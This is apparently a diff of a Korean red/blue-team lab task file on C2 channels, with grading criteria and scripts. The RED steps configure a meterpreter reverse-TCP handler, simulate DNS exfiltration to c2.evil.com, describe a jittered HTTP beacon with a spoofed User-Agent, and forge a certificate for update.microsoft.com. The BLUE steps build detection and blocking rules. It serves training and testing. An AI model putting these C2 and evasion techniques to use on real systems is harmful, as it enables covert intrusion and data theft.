@@ -35,20 +35,22 @@ steps:
     type: output_contains
     expect: LHOST
     semantic:
-      intent: '[RED] C2 채널 구축과 탐지 공격 단계 실습 — 실제 공격 명령/스크립트 실행 및 결과 확인'
+      intent: '[RED] Metasploit multi/handler C2 리스너 기본 구조 — msfconsole -q -x use exploit/multi/handler;
+        set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST; set LPORT; show options; exit. 실제 실행
+        없이 설정만 확인. C2 리스너 동작 원리 이해 (payload 타입·LHOST/LPORT·연결 처리)'
       success_criteria:
-      - 공격 명령/스크립트 실제 실행 또는 유효 페이로드 생성
-      - 목표 기법이 작동함을 출력·로그로 확인
-      - MITRE ATT&CK 기법 ID 또는 명칭 1개 이상 언급
+      - msfconsole + use multi/handler
+      - show options 로 설정 확인
+      - 실제 exploit 없음 (exit)
       acceptable_methods:
-      - 실제 도구(nmap/msfvenom/sqlmap/hydra/curl/ssh) 실행
-      - 방어 규칙 파일(.rules/XML) 작성 또는 편집
-      - Python 스크립트로 자동화 구현
-      - SSH 로 대상 VM 접속 후 명령 실행
+      - msfconsole -x 로 자동 명령
+      - msfconsole resource script
+      - sliver server + listener 대체
+      - python socketserver 직접 구현
       negative_signs:
-      - 실행 없이 개념만 서술
-      - 결과 확인·로그 수집 누락
-      - RED/BLUE 역할 특성 무시한 일반 응답
+      - 실제 listener 실행 (교육 목적 초과)
+      - show options 없이 스킵
+      - C2 개념 없음
   target_vm: attacker
   script: msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp;
     set LHOST 10.20.30.201; set LPORT 4444; show options; exit' 2>&1 | tail -20
@@ -71,20 +73,22 @@ steps:
     type: output_contains
     expect: DNS C2 Simulation
     semantic:
-      intent: '[RED] C2 채널 구축과 탐지 공격 단계 실습 — 실제 공격 명령/스크립트 실행 및 결과 확인'
+      intent: '[RED] DNS 터널링 시뮬레이션 — python3 으로 data=base64.b64encode(payload) + 63바이트 단위 분할 (DNS label
+        길이 제한) + for chunk in chunks: dig TXT <chunk>.c2.evil.com 반복. DNS 는 아웃바운드 통상 허용 → 데이터 유출 채널 악용.
+        iodine/dnscat2 의 원리. MITRE T1071.004'
       success_criteria:
-      - 공격 명령/스크립트 실제 실행 또는 유효 페이로드 생성
-      - 목표 기법이 작동함을 출력·로그로 확인
-      - MITRE ATT&CK 기법 ID 또는 명칭 1개 이상 언급
+      - base64 인코딩 + 63바이트 분할
+      - DNS 쿼리 embedding + 반복 전송 스크립트
+      - DNS label 제한 인지
       acceptable_methods:
-      - 실제 도구(nmap/msfvenom/sqlmap/hydra/curl/ssh) 실행
-      - 방어 규칙 파일(.rules/XML) 작성 또는 편집
-      - Python 스크립트로 자동화 구현
-      - SSH 로 대상 VM 접속 후 명령 실행
+      - python3 base64 + dig/dnspython
+      - iodine 실제 도구 (교육)
+      - dnscat2 PoC
+      - xxd + base32 대체
       negative_signs:
-      - 실행 없이 개념만 서술
-      - 결과 확인·로그 수집 누락
-      - RED/BLUE 역할 특성 무시한 일반 응답
+      - 63바이트 분할 없음
+      - DNS 아닌 HTTP
+      - base64 없이 평문
   target_vm: attacker
   script: 'cat > /tmp/dns_c2_sim.sh << ''SCRIPT'' #!/bin/bash DATA="Sensitive_Data_Exfil_Test_2026" ENCODED=$(echo
     -n "$DATA" | base64 | tr "+/" "-_" | tr -d "=") echo "=== DNS C2 Simulation ===" echo "Original: $DATA"
@@ -111,20 +115,23 @@ steps:
     type: output_contains
     expect: HTTP C2 Beacon
     semantic:
-      intent: '[RED] C2 채널 구축과 탐지 공격 단계 실습 — 실제 공격 명령/스크립트 실행 및 결과 확인'
+      intent: '[RED] HTTP C2 비컨 시뮬레이션 — python3 while True: jitter=random.uniform(0.7, 1.3); sleep_sec=base_interval
+        * jitter; headers={User-Agent: Mozilla/5.0 정상 브라우저}; requests.get(c2_url, headers=headers). 주기적
+        check-in + jitter 로 탐지 회피 + 정상 UA 위장. MITRE T1071.001 Web Protocols'
       success_criteria:
-      - 공격 명령/스크립트 실제 실행 또는 유효 페이로드 생성
-      - 목표 기법이 작동함을 출력·로그로 확인
-      - MITRE ATT&CK 기법 ID 또는 명칭 1개 이상 언급
+      - while True 루프 + sleep (주기적)
+      - jitter (random factor)
+      - 정상 User-Agent 위장
+      - HTTP 비컨 패턴
       acceptable_methods:
-      - 실제 도구(nmap/msfvenom/sqlmap/hydra/curl/ssh) 실행
-      - 방어 규칙 파일(.rules/XML) 작성 또는 편집
-      - Python 스크립트로 자동화 구현
-      - SSH 로 대상 VM 접속 후 명령 실행
+      - python requests + random sleep
+      - curl 반복 + sleep
+      - Cobalt Strike beacon config
+      - Mythic Apollo beacon
       negative_signs:
-      - 실행 없이 개념만 서술
-      - 결과 확인·로그 수집 누락
-      - RED/BLUE 역할 특성 무시한 일반 응답
+      - jitter 없는 고정 간격 (탐지됨)
+      - 기본 UA 사용
+      - 비컨 개념 없음
   target_vm: attacker
   script: 'cat > /tmp/http_c2_beacon.sh << ''SCRIPT'' #!/bin/bash echo "=== HTTP C2 Beacon Simulation
     ===" echo "C2 Server: http://10.20.30.201:8080" echo "Beacon ID: $(hostname)-$(id -u)" echo "Sleep:
@@ -150,20 +157,23 @@ steps:
     type: output_contains
     expect: update.microsoft.com
     semantic:
-      intent: '[RED] C2 채널 구축과 탐지 공격 단계 실습 — 실제 공격 명령/스크립트 실행 및 결과 확인'
+      intent: '[RED] HTTPS C2 자체 서명 인증서 — openssl req -x509 -newkey rsa:2048 -nodes -keyout c2.key -out
+        c2.crt -days 365 -subj /CN=google.com/O=Google Inc. CN 을 유명 서비스(google.com/cloudflare.com)로 위장해
+        TLS 메타데이터 인스펙션 회피 시도. 실제 CA 서명 없어 self-signed red flag'
       success_criteria:
-      - 공격 명령/스크립트 실제 실행 또는 유효 페이로드 생성
-      - 목표 기법이 작동함을 출력·로그로 확인
-      - MITRE ATT&CK 기법 ID 또는 명칭 1개 이상 언급
+      - openssl req -x509 로 자체 서명
+      - CN 위장 (google.com 등 유명 도메인)
+      - RSA 2048 + -days 365
+      - self-signed red flag 인지
       acceptable_methods:
-      - 실제 도구(nmap/msfvenom/sqlmap/hydra/curl/ssh) 실행
-      - 방어 규칙 파일(.rules/XML) 작성 또는 편집
-      - Python 스크립트로 자동화 구현
-      - SSH 로 대상 VM 접속 후 명령 실행
+      - openssl req -x509 -newkey + -subj /CN=...
+      - mkcert 로 로컬 CA 서명
+      - Lets Encrypt 로 합법 서명 (실전)
+      - Cobalt Strike malleable C2 TLS profile
       negative_signs:
-      - 실행 없이 개념만 서술
-      - 결과 확인·로그 수집 누락
-      - RED/BLUE 역할 특성 무시한 일반 응답
+      - 자체 서명 원리 이해 없음
+      - CN 위장 없음
+      - 공개 CA 서명 (실제 서비스)
   target_vm: attacker
   script: openssl req -x509 -newkey rsa:2048 -keyout /tmp/c2_key.pem -out /tmp/c2_cert.pem -days 365 -nodes
     -subj '/CN=update.microsoft.com/O=Microsoft Corporation/C=US' 2>&1 && openssl x509 -in /tmp/c2_cert.pem
@@ -189,20 +199,22 @@ steps:
     type: output_contains
     expect: Beacon likelihood
     semantic:
-      intent: '[BLUE] C2 채널 구축과 탐지 방어·탐지 단계 — 탐지 규칙·모니터링·대응 체계 구현'
+      intent: '[BLUE] C2 비컨 통계 분석 — python3 로 연결 로그에서 각 src_ip 별 연결 간격 리스트 추출 + stdev/mean < 0.15 (변동계수
+        15% 이하) = 규칙적 비컨 의심 로직. 주기적 C2 통신의 통계적 특성 탐지 (Shannon 엔트로피 / periodogram 대안). ML 아닌 statistical
+        anomaly detection'
       success_criteria:
-      - Suricata/Wazuh/auditd/nftables 등 방어 도구 룰·설정 제시
-      - 탐지 시나리오 테스트 및 결과 로그
-      - false positive 또는 tuning 고려 언급
+      - 연결 간격 리스트 추출 + 변동계수 계산
+      - 변동계수 < 0.15 임계치 C2 후보 식별
+      - 통계적 이상치 탐지 개념
       acceptable_methods:
-      - 실제 도구(nmap/msfvenom/sqlmap/hydra/curl/ssh) 실행
-      - 방어 규칙 파일(.rules/XML) 작성 또는 편집
-      - Python 스크립트로 자동화 구현
-      - SSH 로 대상 VM 접속 후 명령 실행
+      - python numpy 로 stdev/mean
+      - RITA Beacon Analysis 도구
+      - Zeek + RITA 통합
+      - Splunk stats 명령
       negative_signs:
-      - 실행 없이 개념만 서술
-      - 결과 확인·로그 수집 누락
-      - RED/BLUE 역할 특성 무시한 일반 응답
+      - 통계 없이 단순 카운트
+      - 변동계수 개념 없음
+      - C2 beacon 특성 없음
   target_vm: secu
   script: 'cat > /tmp/beacon_detector.sh << ''SCRIPT'' #!/bin/bash echo "=== C2 Beacon Pattern Detector
     ===" python3 -c " import statistics intervals = [30, 31, 29, 30, 32, 28, 31, 30, 29, 31] mean = statistics.mean(intervals)
@@ -231,20 +243,22 @@ steps:
     type: output_contains
     expect: c2_block
     semantic:
-      intent: '[BLUE] C2 채널 구축과 탐지 방어·탐지 단계 — 탐지 규칙·모니터링·대응 체계 구현'
+      intent: '[BLUE] nftables C2 차단 룰 — 비표준 아웃바운드 포트 차단 (tcp dport != {80,443,22,53} drop) + DNS 쿼리 rate
+        limit (udp dport 53 limit rate 100/minute) + 블랙리스트 도메인 ip 차단. 아웃바운드 필터링으로 C2 exfiltration 봉쇄.
+        화이트리스트 방식 출구 정책'
       success_criteria:
-      - Suricata/Wazuh/auditd/nftables 등 방어 도구 룰·설정 제시
-      - 탐지 시나리오 테스트 및 결과 로그
-      - false positive 또는 tuning 고려 언급
+      - nft add rule output tcp dport != <허용> drop
+      - DNS rate limit 추가
+      - 아웃바운드 필터링 개념
       acceptable_methods:
-      - 실제 도구(nmap/msfvenom/sqlmap/hydra/curl/ssh) 실행
-      - 방어 규칙 파일(.rules/XML) 작성 또는 편집
-      - Python 스크립트로 자동화 구현
-      - SSH 로 대상 VM 접속 후 명령 실행
+      - nft output drop 정책 + 화이트리스트
+      - iptables -A OUTPUT -p tcp --dport ! <list>
+      - pi-hole DNS 필터링
+      - Squid proxy + 카테고리 필터
       negative_signs:
-      - 실행 없이 개념만 서술
-      - 결과 확인·로그 수집 누락
-      - RED/BLUE 역할 특성 무시한 일반 응답
+      - input 만 차단 (outbound 없음)
+      - 화이트리스트 개념 없음
+      - DNS rate limit 누락
   target_vm: secu
   script: "cat > /tmp/c2_block_rules.nft << 'EOF'\n#!/usr/sbin/nft -f\ntable inet c2_block {\n  set blocked_c2_ips\
     \ {\n    type ipv4_addr\n    elements = { 198.51.100.1, 203.0.113.50 }\n  }\n  chain output {\n  \
@@ -273,20 +287,22 @@ steps:
     type: output_contains
     expect: C2-DETECT
     semantic:
-      intent: '[BLUE] C2 채널 구축과 탐지 방어·탐지 단계 — 탐지 규칙·모니터링·대응 체계 구현'
+      intent: '[BLUE] Suricata DNS 터널링 + 자체 서명 TLS 탐지 — alert dns (dns.query; content:.c2.; pcre: DNS
+        query length > 60) + alert tls (tls.cert_subject; content:self-signed) 또는 tls-sni 분석. DNS label
+        길이·엔트로피·TLS 인증서 체인 검증 기반 룰. w3 s2,s4 의 RED 공격 탐지'
       success_criteria:
-      - Suricata/Wazuh/auditd/nftables 등 방어 도구 룰·설정 제시
-      - 탐지 시나리오 테스트 및 결과 로그
-      - false positive 또는 tuning 고려 언급
+      - alert dns + content 기반 터널링 탐지
+      - alert tls + 자체 서명 인증서 탐지
+      - DNS query length 또는 엔트로피 활용
       acceptable_methods:
-      - 실제 도구(nmap/msfvenom/sqlmap/hydra/curl/ssh) 실행
-      - 방어 규칙 파일(.rules/XML) 작성 또는 편집
-      - Python 스크립트로 자동화 구현
-      - SSH 로 대상 VM 접속 후 명령 실행
+      - alert dns + pcre DNS query regex
+      - alert tls + tls.cert_subject content
+      - ET Open TLS 룰셋
+      - ja3/ja4 fingerprint 기반
       negative_signs:
-      - 실행 없이 개념만 서술
-      - 결과 확인·로그 수집 누락
-      - RED/BLUE 역할 특성 무시한 일반 응답
+      - DNS 또는 TLS 한쪽만
+      - 엔트로피/길이 분석 없음
+      - RED 공격(s2/s4) 연관 없음
   target_vm: secu
   script: 'cat > /tmp/c2_detection.rules << ''EOF'' alert dns any any -> any any (msg:"C2-DETECT: Long
     DNS query - possible tunneling"; dns.query; pcre:"/^[a-zA-Z0-9+\/]{40,}/"; sid:2000001; rev:1;) alert
@@ -315,20 +331,22 @@ steps:
     type: output_contains
     expect: Red Flags
     semantic:
-      intent: '[BLUE] C2 채널 구축과 탐지 방어·탐지 단계 — 탐지 규칙·모니터링·대응 체계 구현'
+      intent: '[BLUE] TLS 인증서 메타데이터 Red Flag 식별 — openssl s_client -connect <host>:443 -servername <sni>
+        </dev/null + openssl x509 -noout -subject -issuer -dates 로 CN(자체 서명 여부·유명 도메인 가장) + issuer(신뢰된
+        CA 아님) + 발급일(최근 생성) 검사. 4가지 Red Flag (self-signed/recent/비정상 CN/비정상 issuer)'
       success_criteria:
-      - Suricata/Wazuh/auditd/nftables 등 방어 도구 룰·설정 제시
-      - 탐지 시나리오 테스트 및 결과 로그
-      - false positive 또는 tuning 고려 언급
+      - openssl s_client + x509 메타데이터 추출
+      - 4가지 Red Flag 검사 (self-signed·recent·CN·issuer)
+      - C2 서버 식별 목적
       acceptable_methods:
-      - 실제 도구(nmap/msfvenom/sqlmap/hydra/curl/ssh) 실행
-      - 방어 규칙 파일(.rules/XML) 작성 또는 편집
-      - Python 스크립트로 자동화 구현
-      - SSH 로 대상 VM 접속 후 명령 실행
+      - openssl s_client + x509 -noout
+      - testssl.sh --protocols --ciphers
+      - Censys/Shodan cert DB 질의
+      - ja3 / ja4 fingerprinting
       negative_signs:
-      - 실행 없이 개념만 서술
-      - 결과 확인·로그 수집 누락
-      - RED/BLUE 역할 특성 무시한 일반 응답
+      - 인증서 검사 없음
+      - Red Flag 개념 없음
+      - C2 식별 맥락 없음
   target_vm: secu
   script: echo | openssl s_client -connect 10.20.30.80:443 -servername 10.20.30.80 2>/dev/null | openssl
     x509 -noout -issuer -subject -dates -fingerprint 2>/dev/null; echo '---'; echo 'C2 Certificate Red
@@ -358,20 +376,21 @@ steps:
     type: output_contains
     expect: C2 Infrastructure TTP
     semantic:
-      intent: '[RED/BLUE] C2 채널 구축과 탐지 통합 — Phase 전환 또는 종합 보고서·환경 정리'
+      intent: '[RED/BLUE] 정리 + C2 TTP 보고서 /tmp/c2_report.txt — 각 C2 기법(multi-handler·DNS 터널·HTTP beacon·HTTPS
+        자체서명) → MITRE ATT&CK Techniques(T1071.001/004·T1573·T1090) 매핑 + 탐지 방법(통계/Suricata/인증서 검사) + 차단
+        전략(nftables outbound·DNS rate·TLS inspect). 공격·탐지·차단 3요소 통합. 환경 정리(rm 인증서·스크립트)'
       success_criteria:
-      - RED/BLUE 양쪽 산출물 모두 포함 또는 정리
-      - 보고서 파일 저장 또는 markdown 출력
-      - MITRE ATT&CK 매핑 + 개선 권고
+      - /tmp/c2_report.txt 파일 생성
+      - C2 기법 + ATT&CK + 탐지 + 차단 매핑
+      - 정리 수행 (rm 등)
       acceptable_methods:
-      - 실제 도구(nmap/msfvenom/sqlmap/hydra/curl/ssh) 실행
-      - 방어 규칙 파일(.rules/XML) 작성 또는 편집
-      - Python 스크립트로 자동화 구현
-      - SSH 로 대상 VM 접속 후 명령 실행
+      - cat > file + 4개 카테고리 표
+      - MITRE ATT&CK Navigator export
+      - kill sessions + rm files
       negative_signs:
-      - 실행 없이 개념만 서술
-      - 결과 확인·로그 수집 누락
-      - RED/BLUE 역할 특성 무시한 일반 응답
+      - TTP 매핑 없음
+      - 차단 전략 누락
+      - 정리 누락
   target_vm: attacker
   script: "rm -f /tmp/c2_*.pem /tmp/dns_c2_sim.sh /tmp/http_c2_beacon.sh /tmp/beacon_detector.sh 2>/dev/null\
     \ && cat > /tmp/c2_ttp_report.txt << 'EOF'\n=== C2 Infrastructure TTP Analysis Report ===\n\n1. C2\
